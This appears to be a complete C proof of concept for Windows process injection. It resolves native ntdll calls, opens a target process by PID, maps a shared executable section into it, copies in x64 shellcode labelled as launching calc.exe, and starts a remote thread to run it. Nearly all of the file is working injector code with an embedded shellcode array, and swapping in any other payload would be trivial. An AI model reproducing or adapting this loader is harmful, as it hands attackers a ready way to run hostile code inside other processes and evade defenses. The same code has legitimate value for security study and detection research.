#include <stdio.h>
#include <Windows.h>

typedef long NTSTATUS;
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) == 0)

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  pBuffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT;

typedef NTSTATUS(NTAPI* _NtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
);

typedef NTSTATUS(NTAPI* _NtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    SECTION_INHERIT InheritDisposition,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS(NTAPI* _NtCreateThreadEx)(
    PHANDLE hThread,
    ACCESS_MASK DesiredAccess,
    LPVOID ObjectAttributes,
    HANDLE ProcessHandle,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    BOOL CreateSuspended,
    ULONG64 StackZeroBits,
    ULONG64 SizeOfStackCommit,
    ULONG64 SizeOfStackReserve,
    LPVOID lpBytesBuffer
);

// 💣 calc.exe shellcode (x64)
unsigned char payload[] = {
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
    0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
    0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
    0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
    0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
    0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
    0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
    0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
    0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4b, 0xff, 0xff, 0xff, 0x5d, 0x49,
    0xc7, 0xc1, 0x00, 0x00, 0x00, 0x00, 0x48, 0x81, 0xc4, 0x40, 0x01, 0x00,
    0x00, 0x49, 0xb8, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x41,
    0x50, 0x48, 0x89, 0xe2, 0x41, 0x52, 0xff, 0xd0
};

int main(int argc, char** argv) {
    int pid = 0;
    if (argc != 2) {
        printf("[!] filename.exe <PID> \n");
        return -1;
    }
    pid = atoi(argv[1]);

    _NtCreateSection pNtCreateSection = (_NtCreateSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection");
    _NtMapViewOfSection pNtMapViewOfSection = (_NtMapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtMapViewOfSection");
    _NtCreateThreadEx pNtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");

    if (!pNtCreateSection || !pNtMapViewOfSection || !pNtCreateThreadEx) {
        printf("[-] API resolve failed.\n");
        return -1;
    }

    HANDLE hSection, hThread;
    PVOID local_view_addr = NULL;
    PVOID remote_view_addr = NULL;
    SIZE_T size = sizeof(payload) + 0x100;
    LARGE_INTEGER section_size = { .QuadPart = size };

    HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hTargetProcess) {
        printf("[-] Failed to open target process. Err %d\n", GetLastError());
        return -1;
    }

    NTSTATUS status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &section_size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to create section. Err 0x%x\n", status);
        return -1;
    }

    status = pNtMapViewOfSection(hSection, GetCurrentProcess(), &local_view_addr, 0, 0, NULL, &size, ViewUnmap, 0, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to map section to local. Err 0x%x\n", status);
        return -1;
    }

    status = pNtMapViewOfSection(hSection, hTargetProcess, &remote_view_addr, 0, 0, NULL, &size, ViewUnmap, 0, PAGE_EXECUTE_READ);
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to map section to remote. Err 0x%x\n", status);
        return -1;
    }

    memcpy(local_view_addr, payload, sizeof(payload));

    status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hTargetProcess, (LPTHREAD_START_ROUTINE)remote_view_addr, NULL, FALSE, 0, 0, 0, NULL);
    if (!NT_SUCCESS(status)) {
        printf("[-] Error Creating Thread: 0x%x\n", status);
        return -1;
    }

    printf("[+] calc.exe launched inside PID %d!\n", pid);
    return 0;
}
